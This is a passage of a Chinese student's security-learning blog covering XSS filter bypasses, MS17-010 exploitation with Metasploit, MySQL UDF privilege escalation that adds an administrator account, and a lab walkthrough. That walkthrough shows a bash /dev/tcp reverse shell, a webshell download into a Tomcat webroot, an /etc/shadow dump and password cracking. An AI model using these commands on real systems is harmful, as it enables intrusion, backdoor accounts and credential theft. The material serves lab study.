start="7"><li>绕过过滤domain为空的xss</li></ol><ul><li>双写绕过<br>过滤一个domain，可以制造这样的payload。<br>dodomainmain<br>这个payload使得浏览器将domain过滤掉，剩下的do和main重新构成了domain。</li><li>编码绕过<br>构造payload进行base64加密。<br>eval<br>atob：将base64进行解码，转换成明文，并通过eval来执行javascript代码。<script>eval(atob('base64编码'));</script></li><li>空格绕过：<br>如果浏览器过滤了script关键字或者其他的什么关键字，导致javascript代码无法执行，那么可以考虑空格绕过。</li><li>利用IE特性绕过xss过滤（只适用于IE浏览器）</li></ul><pre class="language-shell" data-language="shell"><code class="language-shell">IE特性：两个反引号``可以闭合一个左边双引号</code></pre><p>CSS绕过<br>CSS特性介绍<br><code>background:url(&quot;javascript:alert(document.domain);&quot;);</code>    设置背景颜色<br>这是利用javascript伪协议执行js，目前只有IE浏览器支持，其他的不支持</p><pre class="language-css" data-language="css"><code class="language-css">payload触发CSS<span class="token property">background-color</span><span class="token punctuation">:</span>#f00<span class="token punctuation">;</span><span class="token property">background</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"javascript:alert(document.domain);"</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span></code></pre><p>先到这里，后续还有几个不常见的知识点，回头学了再补吧。最近有点累，要期末考试了，也该准备下复习了。睡觉睡觉，今天早点睡，不熬了。<br>对了突然想起来，这个好像是之前学长布置的作业来着，果然还是那个老毛病，不到检查作业最后一刻，绝对不提前写完。哈哈哈。下周十六周，刚刚好，截至周。<br>现在没事回头看看自己写的博客和印象笔记。哈哈学了不少东西呐。<br>从2020.1.12发的第一篇文章到现在4个多月了，看看还是蛮有成就感的。</p><p>嗯！要继续加油啊。</p><p>文末寄语：</p><blockquote><p>在这世上，有些东西是石头无法刻成的，在我们心里，有一块地方是无法锁住的，那块地方叫做希望。——《肖申克的救赎》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows系统远程提权、MySQL UDF提权</title>
      <link href="/posts/cbecbb18/"/>
      <url>/posts/cbecbb18/</url>
      
        <content type="html"><![CDATA[<p>前言<br>小白一枚，之前听过的比较厉害的操作就是提权，维权。今天学习一下。</p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="提权本质"><a href="#提权本质" class="headerlink" title="提权本质"></a>提权本质</h2><p>提权本质就是提升自己在服务器中的权限，获得更大的权限。<br>例如：在Windows系统下普通用户，通过提权获得Administrator一样的权限；在linux中通过执行编译后的程序，从普通用户权限提升到root账号权限。</p><h2 id="提权分类"><a href="#提权分类" class="headerlink" title="提权分类"></a>提权分类</h2><p>第一种分类：</p><ul><li>本地提权<br>当前登录到系统是一个普通用户，通过在本地执行的操作和程序来获得更高的权限</li><li>远程提权<br>远程提权是指在远程的机器上对目标服务器进行对应操作和执行程序对目标系统发送数据包，针对目标系统所存在的漏洞来获得最高的权限Administrator或者root。<br>第二种分类</li><li>系统提权<br>针对系统的弱点或者漏洞来提升应的权限</li><li>第三方软件提权<br>利用系统上安装的一些软件(下载的)，通过这些软件来提升权限。<h1 id="windows系统提权基础命令"><a href="#windows系统提权基础命令" class="headerlink" title="windows系统提权基础命令"></a>windows系统提权基础命令</h1></li><li>获取IP地址信息<br>IP地址是计算机在网络中的门牌号，用来寻找计算机的地址。同一台计算机有多个IP地址，可以有外部连接的IP地址，内部IP地址。</li></ul><p>在提权过程中，如果有外网IP地址，可以直接使用3389端口进行远程桌面连接。<br>在windows系统下使用 <code>ipconfig /all</code>查看网卡信息。<br>ipconfig获取的信息其实是不全面的，加个<code>/all</code>可以查看全部网卡信息。一般192.168开头的是私网地址。</p><ul><li>获取端口信息<br>端口是计算机与外部连接的一个接口，每个开放的服务对应一个端口。<br>windows系统下可以使用netstat命令获取端口开放状态。<br><code>netstat -an</code>获取当前主机所有端口的开放情况及网络连接情况。</li><li>获取服务信息和进程信息<br>在windows系统下可以使用<code>tasklist /svc</code>命令获取运行的进程名称、服务、和PID。</li><li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">添加链接描述</a>进程结束、用户管理命令</li></ul><p>1.使用<code>taskkill</code>来结束进程。<code>taskkill /?</code>获取帮助信息。<br>2.在windows系统下，系统访问需要有对应的用户和密码。<br>可以通过以下命令添加用户</p><pre class="language-shell" data-language="shell"><code class="language-shell">net user username password /addnet localgroup administrator username /add</code></pre><h1 id="windows提权辅助工具"><a href="#windows提权辅助工具" class="headerlink" title="windows提权辅助工具"></a>windows提权辅助工具</h1><h2 id="辅助工具介绍"><a href="#辅助工具介绍" class="headerlink" title="辅助工具介绍"></a>辅助工具介绍</h2><p>Windows-Exploit-Suggester此工具将目标补丁与Microsoft漏洞数据库进行比较，以检测目标上潜在的缺失补丁。<br>github项目地址——🔑<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">传送门</a><br>安装环境：python2.7、安装xlrd模块</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#只有一个python2的环境</span>python <span class="token operator">-</span>m pip install xlrd<span class="token comment">#同时集合python2和python3</span>python2 <span class="token operator">-</span>m pip install xlrd</code></pre><p><img src="https://img-blog.csdnimg.cn/20200701141517806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>安装成功。<br>然后执行<code>--update</code>以获取漏洞文件<br><img src="https://img-blog.csdnimg.cn/20200701141914592.png" alt="m0re" loading="lazy"><br>在文件目录下获得一个这样的文件。<br>然后获取一个本机文件</p><pre class="language-bash" data-language="bash"><code class="language-bash">systeminfo</code></pre><p>然后使用命令将这些内容写入一个文件中，</p><pre class="language-bash" data-language="bash"><code class="language-bash">systeminfo <span class="token operator">></span> win7.txt</code></pre><p>生成一个win7文件，将它粘贴到辅助工具目录下。<br>使用命令进行测试</p><pre class="language-python" data-language="python"><code class="language-python">python windows<span class="token operator">-</span>exploit<span class="token operator">-</span>suggester<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>audit <span class="token operator">-</span>i win7<span class="token punctuation">.</span>txt <span class="token operator">-</span>d <span class="token number">2020</span><span class="token operator">-</span><span class="token number">07</span><span class="token operator">-</span><span class="token number">01</span><span class="token operator">-</span>mssb<span class="token punctuation">.</span>xls</code></pre><p>然后对比出来一些重要漏洞<br><img src="https://img-blog.csdnimg.cn/20200701143646121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>如：MS13-055就是13年的第55个漏洞。</p><h1 id="windows远程提权"><a href="#windows远程提权" class="headerlink" title="windows远程提权"></a>windows远程提权</h1><p>在授权的情况下，针对目标机器进行提权。可以首先扫描系统是否存在可利用漏洞，探测是否可以利用。</p><p>如果可以直接获得最高权限，那么就不需要本地提权，直接远程提权拿到最高权限。<br>介绍一个漏洞ms17-010<br>ms17-010是一个安全类型的补丁，MS17-010更新修复了Microsoft Windows中的漏洞。</p><blockquote><p>WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件，大小3.3MB，由不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。勒索病毒是自熊猫烧香以来影响力最大的病毒之一。</p></blockquote><p>扫描探测ms17-010漏洞<br>在metasploit下直接利用ms17-010的漏洞扫描模块进行探测。<br>利用metasploit下的<code>windows/smb/ms17_010_eternalblue</code>模块进行远程提权<br>设置完参数就可以进行攻击：</p><pre class="language-bash" data-language="bash"><code class="language-bash">exploit<span class="token comment">#开始执行</span>shell<span class="token comment">#使用shell命令/功能</span><span class="token function">whoami</span><span class="token comment">#查询当前登录的用户会发现是windows最高权限system</span></code></pre><p>这个真的厉害，学到了。</p><h2 id="上手操作一下"><a href="#上手操作一下" class="headerlink" title="上手操作一下"></a>上手操作一下</h2><p>首先需要开启一台win7虚拟机，然后看一下win7的IP地址。<br>打开kali终端输入<code>msfconsole</code>启用metasploit<br>使用搜查ms17-010模块，<code>use auxiliary/scanner/smb/smb_ms17_010 </code><br>设置rhost参数：<code>set rhosts 192.168.xx.xx</code><br>然后<code>run</code><br>就可以查询当前IP是否存在漏洞了。<code>search ms17-010</code><br><img src="https://img-blog.csdnimg.cn/20200701162447397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>可以看出，这个漏洞是2017年3月14日的。<br>既然存在漏洞了，那就利用这个漏洞来进行提权操作。<br>metasploit下也集成了ms17-010的漏洞利用模块。<code>use exploit/windows/smb/ms17_010_eternalblue</code><br>当然还有其他的模块。下面这个就是win8系统的。现在我的是win7，所以就用上面的这个就行。<br><img src="https://img-blog.csdnimg.cn/20200701163236242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后设置一下rhosts就行了。好像是升级了，居然这么简单。设置好参数后直接使用<code>exploit</code>直接进行提权，等待一会。<br>过程很快的还是。直接输入<code>whoami</code><br>会发现，已经是最高权限登录到win7了<br><img src="https://img-blog.csdnimg.cn/20200701164359235.png" alt="m0re" loading="lazy"><br>成功了。</p><h1 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql UDF提权"></a>Mysql UDF提权</h1><h2 id="udf介绍"><a href="#udf介绍" class="headerlink" title="udf介绍"></a>udf介绍</h2><p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。</p><blockquote><p>在提权过程中，经常使用mysql的udf.dl进行提权。并且提权之前，要上传udf.dll到指定的目录下。使用select@@plugin_dir；或show<br>variables like’plugin%’，查看具体目录。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200701175902929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>修改目录方式：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">1</span>、mysqld.exe--plugin-dir<span class="token operator">=</span>具体目录<span class="token number">2</span>、mysqld.exe--defaults-file<span class="token operator">=</span>具体目录<span class="token number">3</span>、mysql.ini配置文件plugindir<span class="token operator">=</span>具体目录</code></pre><h2 id="udf-dll获取"><a href="#udf-dll获取" class="headerlink" title="udf.dll获取"></a>udf.dll获取</h2><p>sqlmap下自带了对应提权使用的udf库。可以直接下载使用，但是sqlmap进行加密，需要解密使用。<br>sqlmap在kali中自带，可以使用下面这个方法。<br>sqlmap在<code>/root/usr/share/sqlmap</code><br>关于UDF则是在<br><img src="https://img-blog.csdnimg.cn/20200701183915508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>因为我的mysql是win32，所以选择32<br>奥，至于查看的话，在mysql命令行中使用</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@version_compile_os</span><span class="token punctuation">;</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200701184210678.png" alt="m0re" loading="lazy"><br>不过这个udf是加密的，不过sqlmap中有解密的脚本，可以直接使用，脚本在extra中的cloak中，<br><img src="https://img-blog.csdnimg.cn/20200701184336892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后就可以使用了，命令为</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>cloak<span class="token punctuation">.</span>py <span class="token operator">-</span>d <span class="token operator">-</span>i <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>sqlmap<span class="token operator">/</span>data<span class="token operator">/</span>udf<span class="token operator">/</span>mysql<span class="token operator">/</span>windows<span class="token operator">/</span><span class="token number">32</span><span class="token operator">/</span>lib_mysqludf_sys<span class="token punctuation">.</span>dll_</code></pre><p>不过我的使用时出问题了，忙着解决，也忘了截图了。我放弃了在linux中解密的方法，我在win7中也有sqlmap，所以我就在win7中解密了，可以成功。<br><img src="https://img-blog.csdnimg.cn/20200701184708439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后在cloak目录下生成了dll文件。<br><img src="https://img-blog.csdnimg.cn/20200701184803670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="上传udf"><a href="#上传udf" class="headerlink" title="上传udf"></a>上传udf</h2><p>将udf.dll文件上传到具体目录下。<br>具体目录上面已经说过查询方法。</p><p>上传方式:<br>利用SQL注入进行上传<code>select load_file() into dumpfile &quot; 具体路径&quot;</code><br>使用菜刀直接上传<br>emmm我直接将文件放在对应目录下了，不演示上传<br><img src="https://img-blog.csdnimg.cn/20200701192730719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="执行提权命令"><a href="#执行提权命令" class="headerlink" title="执行提权命令"></a>执行提权命令</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">function</span> sys_eval <span class="token keyword">returns</span> string <span class="token keyword">soname</span> <span class="token string">'udf.dll;select* from mysqlaiunc where name='</span>sys_eval<span class="token string">';select sys _eval('</span>dir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys _eval<span class="token punctuation">(</span><span class="token string">'net user user1 123 /add'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys _eval<span class="token punctuation">(</span>'net localgroup administrators user1 <span class="token operator">/</span><span class="token keyword">add</span>"<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">drop</span> <span class="token keyword">function</span> sys_eval<span class="token punctuation">;</span></code></pre><p>如果出现这样的界面就是对了。<br><img src="https://img-blog.csdnimg.cn/20200701192839480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后进行下面的步骤就行。<br><img src="https://img-blog.csdnimg.cn/20200701193333804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后会执行dir命令，显示当前目录下的文件。<br>如果电脑中安装有360安全(LM)卫士，会有提示的<br><img src="https://img-blog.csdnimg.cn/20200701193518188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>emmm ,这基本就是MySQL的UDF提权的操作了。学到了好多。</p><p>此次学习到此结束。</p><p>文末寄语：</p><blockquote><p>所有的悲伤，总会留下一丝欢乐的线索。所有的遗憾，总会留下一处完美的角落。我在冰封的深海，找寻希望的缺口。却在午夜惊醒时，蓦然瞥见绝美的月光。——《缺口》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全漏洞靶场演示</title>
      <link href="/posts/a8b30840/"/>
      <url>/posts/a8b30840/</url>
      
        <content type="html"><![CDATA[<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>一般查看home目录，挖掘用户信息：<code>ls -alh /home</code><br>查看具体用户的目录：<code>ls -alh /home/用户名/</code><br>查看系统信息：<code>uname -a</code><br><img src="https://img-blog.csdnimg.cn/20200814235824608.jpg" alt="m0re" loading="lazy"></p><p>利用ssh命令执行root权限命令<br>使用<code>ssh 用户名@localhost</code>通过ssh登录服务器是不需要身份验证的；<br>比如查看bill用户sudo命令的权限：<code>ssh bill@localhost sudo -l</code><br>ubuntu自带防火墙，所以关闭防火墙方便后面的操作。<br><code>ssh bill@localhost sudo ufw disable</code><br>反弹shell<br>攻击机启动监听netcat<br><code>nc -nlvp 4444</code><br>查看是否nc正在监听<br><code>netstat -pantu</code><br><img src="https://img-blog.csdnimg.cn/20200814235915744.jpg#pic_center" alt="m0re" loading="lazy"></p><p>靶场机器反弹shell</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> bill@locahost <span class="token function">sudo</span> <span class="token function">bash</span> -i <span class="token operator">>&amp;</span> /dev/tcp/ip/4444 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre><p>然后监听端<br><img src="https://img-blog.csdnimg.cn/20200814235942413.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>渗透测试技巧</p><ul><li>开启python简易http服务器<pre class="language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>m SimpleHTTPServer</code></pre>利用命令执行下载木马文件<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> bill@localhost <span class="token function">sudo</span> <span class="token function">wget</span> <span class="token string">"http://[ip]:[port]/shell.jsp"</span> -O /var/lib/tomcat8/webapps/ROOT/shell.jsp</code></pre>不过没有成功<br><img src="https://img-blog.csdnimg.cn/20200815000108253.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2>使用wpscan对用户名进行提取<pre class="language-bash" data-language="bash"><code class="language-bash">wpscan --url www.vtcsec.com/secret/ --enumerate u</code></pre>探测到一个用户名为admin<br><img src="https://img-blog.csdnimg.cn/20200815000210852.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></li></ul><p>使用metasploit进行暴力破解<br><img src="https://img-blog.csdnimg.cn/20200815000303612.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>破解完成，密码admin<br><img src="https://img-blog.csdnimg.cn/20200815000315952.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>登录成功<br><img src="https://img-blog.csdnimg.cn/20200815000340727.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>制作webshell进行上传。</p><p>访问404界面</p><pre class="language-bash" data-language="bash"><code class="language-bash">http://vtcsec/secret/wp-content/themes/twentyseventeen/404.php</code></pre><p>这里再提一下之前的提权，这次这个可以查看shadow文件</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">cat</span> <span class="token operator">/</span>etc<span class="token operator">/</span>shadowroot:<span class="token operator">!</span>:17484:0:99999:7:::daemon:<span class="token operator">*</span>:17379:0:99999:7:::bin:<span class="token operator">*</span>:17379:0:99999:7:::sys:<span class="token operator">*</span>:17379:0:99999:7:::sync:<span class="token operator">*</span>:17379:0:99999:7:::games:<span class="token operator">*</span>:17379:0:99999:7:::man:<span class="token operator">*</span>:17379:0:99999:7:::<span class="token function">lp</span>:<span class="token operator">*</span>:17379:0:99999:7:::mail:<span class="token operator">*</span>:17379:0:99999:7:::news:<span class="token operator">*</span>:17379:0:99999:7:::uucp:<span class="token operator">*</span>:17379:0:99999:7:::proxy:<span class="token operator">*</span>:17379:0:99999:7:::www<span class="token operator">-</span><span class="token keyword">data</span>:<span class="token operator">*</span>:17379:0:99999:7:::backup:<span class="token operator">*</span>:17379:0:99999:7:::list:<span class="token operator">*</span>:17379:0:99999:7:::irc:<span class="token operator">*</span>:17379:0:99999:7:::gnats:<span class="token operator">*</span>:17379:0:99999:7:::nobody:<span class="token operator">*</span>:17379:0:99999:7:::systemd<span class="token operator">-</span>timesync:<span class="token operator">*</span>:17379:0:99999:7:::systemd<span class="token operator">-</span>network:<span class="token operator">*</span>:17379:0:99999:7:::systemd<span class="token operator">-</span>resolve:<span class="token operator">*</span>:17379:0:99999:7:::systemd<span class="token operator">-</span>bus<span class="token operator">-</span>proxy:<span class="token operator">*</span>:17379:0:99999:7:::syslog:<span class="token operator">*</span>:17379:0:99999:7:::_apt:<span class="token operator">*</span>:17379:0:99999:7:::messagebus:<span class="token operator">*</span>:17379:0:99999:7:::uuidd:<span class="token operator">*</span>:17379:0:99999:7:::lightdm:<span class="token operator">*</span>:17379:0:99999:7:::whoopsie:<span class="token operator">*</span>:17379:0:99999:7:::avahi<span class="token operator">-</span>autoipd:<span class="token operator">*</span>:17379:0:99999:7:::avahi:<span class="token operator">*</span>:17379:0:99999:7:::dnsmasq:<span class="token operator">*</span>:17379:0:99999:7:::colord:<span class="token operator">*</span>:17379:0:99999:7:::speech<span class="token operator">-</span>dispatcher:<span class="token operator">!</span>:17379:0:99999:7:::hplip:<span class="token operator">*</span>:17379:0:99999:7:::kernoops:<span class="token operator">*</span>:17379:0:99999:7:::pulse:<span class="token operator">*</span>:17379:0:99999:7:::rtkit:<span class="token operator">*</span>:17379:0:99999:7:::saned:<span class="token operator">*</span>:17379:0:99999:7:::usbmux:<span class="token operator">*</span>:17379:0:99999:7:::marlinspike:<span class="token variable">$6</span><span class="token variable">$wQb5nV3T</span><span class="token variable">$xB2WO</span><span class="token operator">/</span>jOkbn4t1RUILrckw69LR<span class="token operator">/</span>0EMtUbFFCYpM3MUHVmtyYW9<span class="token punctuation">.</span>ov<span class="token operator">/</span>aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4<span class="token operator">/</span>:17484:0:99999:7:::mysql:<span class="token operator">!</span>:17486:0:99999:7:::sshd:<span class="token operator">*</span>:17486:0:99999:7:::</code></pre><p>所以可以进行尝试之前提到的一种提权方式<br>先将两个文件下载下来</p><pre class="language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> download /etc/shadow<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Downloading: /etc/shadow -<span class="token operator">></span> shadow<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Downloaded <span class="token number">1.27</span> KiB of <span class="token number">1.27</span> KiB <span class="token punctuation">(</span><span class="token number">100.0</span>%<span class="token punctuation">)</span>: /etc/shadow -<span class="token operator">></span> shadow<span class="token punctuation">[</span>*<span class="token punctuation">]</span> download   <span class="token builtin class-name">:</span> /etc/shadow -<span class="token operator">></span> shadowmeterpreter <span class="token operator">></span> download /etc/passwd<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Downloading: /etc/passwd -<span class="token operator">></span> <span class="token function">passwd</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Downloaded <span class="token number">2.31</span> KiB of <span class="token number">2.31</span> KiB <span class="token punctuation">(</span><span class="token number">100.0</span>%<span class="token punctuation">)</span>: /etc/passwd -<span class="token operator">></span> <span class="token function">passwd</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> download   <span class="token builtin class-name">:</span> /etc/passwd -<span class="token operator">></span> <span class="token function">passwd</span></code></pre><p>然后逆向一下这两个文件</p><pre class="language-bash" data-language="bash"><code class="language-bash">unshadow <span class="token function">passwd</span> shadow <span class="token operator">></span> cracked</code></pre><p>然后会发现有了cracked这个文件，在用John进行破解一下，就得到了一个用户名和密码<code>marlinspike</code><br><img src="https://img-blog.csdnimg.cn/20200815000408655.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后登录到一个相对较高的用户，得到一个较高的权限，这个时候，可以使用<code>sudo -l</code><br>查看可以使用的sudo命令。<br>然后发现可以使用<code>sudo bash</code><br>最后得到root权限<br><img src="https://img-blog.csdnimg.cn/20200815000424529.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="命令执行-使用集成工具测试"><a href="#命令执行-使用集成工具测试" class="headerlink" title="命令执行(使用集成工具测试)"></a>命令执行(使用集成工具测试)</h2><p>一个工具，是个坑，不知道什么时候改名字了，原本叫sparta，我找半天没找到，就自己安装，总是定位不到依赖包，尝试了各种方法也没有安装成功。就是因为它改名字了，现在叫legion<br><img src="https://img-blog.csdnimg.cn/20200815000445566.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>感谢那个发现改名的大师傅。<br>其他没什么了。</p><h2 id="中间件PUT漏洞"><a href="#中间件PUT漏洞" class="headerlink" title="中间件PUT漏洞"></a>中间件PUT漏洞</h2><h3 id="中间件介绍"><a href="#中间件介绍" class="headerlink" title="中间件介绍"></a>中间件介绍</h3><p>中间件包括<code>apache、tomcat、IIS、weblogic</code>等，这些中间件可以设置支持的http方法。（HTTP方法包括GET、POST、HEAD、DELETE、PUT、OPTIONS等）<br>每一个HTTP方法都有其对应的功能，在这些方法中，PUT可以直接从客户机上传文件到服务器。如果中间件开放了HTTP中的PUT方法，那么恶意攻击者就可以直接上传webshell到服务器对应的目录。<br>直接上传shell，也可以从侧面反映PUT漏洞的眼中危害性。</p><h3 id="测试靶场"><a href="#测试靶场" class="headerlink" title="测试靶场"></a>测试靶场</h3><p>使用nikto和dirb等工具扫描，除了扫描出来一个test目录，什么也没有；Owasp zap这个漏洞扫描器也没有结果；所以学习一个新工具curl</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -v -X OPTIONS http://10.0.2.8/test</code></pre><p><img src="https://img-blog.csdnimg.cn/20200815000503682.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>利用PUT漏洞获取shell思路：<br>上传webshell到服务器，之后通过对应的目录遍历路径访问webshell，执行webshell。在kali linux中获取反弹shell；<br>上传webshell；在test目录下直接使用浏览器插件poster，上传webshell<br>使用<code>/usr/share/webshells/php/</code>下的webshell<br>使用火狐工具插件RESTClient上传，内容粘贴shell的代码。然后nc监听相应端口；<br><img src="https://img-blog.csdnimg.cn/20200815000703413.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>然后发送，再去浏览器访问这个URL就可以执行shell了；<br>查看nc监听情况。<br>得到shell<br><img 